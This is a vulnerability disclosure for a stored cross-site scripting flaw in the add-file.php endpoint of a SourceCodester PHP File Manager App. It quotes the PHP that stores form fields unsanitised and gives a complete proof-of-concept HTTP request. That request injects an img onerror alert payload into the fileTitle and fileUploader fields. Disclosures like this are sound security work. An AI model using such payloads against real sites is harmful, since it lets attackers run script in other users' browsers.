# SOURCECODESTER / File Manager App - Stored XSS add-file.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/16919/file-manager-app-using-php-source-code.html

## Affected Component
> /endpoint/add-file.php

## Code
```php
        $fileTitle = $_POST["fileTitle"];
        $fileUploader = isset($_POST["fileUploader"]) ? $_POST["fileUploader"] : "";


 $sql = "INSERT INTO tbl_file (file_title, file, file_uploader, date_uploaded) VALUES (:fileTitle, :uploadedFileName, :fileUploader, :dateUploaded)";
                $stmt = $conn->prepare($sql);
                $stmt->bindParam(':fileTitle', $fileTitle);
                $stmt->bindParam(':uploadedFileName', $uploadedFileName);
                $stmt->bindParam(':fileUploader', $fileUploader);
                $stmt->bindParam(':dateUploaded', $dateUploaded);
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /endpoint/add-file.php HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuV4b4E6bYtWMxE9Q
Content-Length: 461


------WebKitFormBoundaryuV4b4E6bYtWMxE9Q
Content-Disposition: form-data; name="fileTitle"

<img src=x onerror=alert('NoChizPlz')>
------WebKitFormBoundaryuV4b4E6bYtWMxE9Q
Content-Disposition: form-data; name="file"; filename="csv.csv"
Content-Type: text/txt

NochizPlz
------WebKitFormBoundaryuV4b4E6bYtWMxE9Q
Content-Disposition: form-data; name="fileUploader"

<img src=x onerror=alert('NoChizPlz')>
------WebKitFormBoundaryuV4b4E6bYtWMxE9Q--

```

## Screenshot
![img.png](STORED%20XSS%20add-file%2Fimg.png)

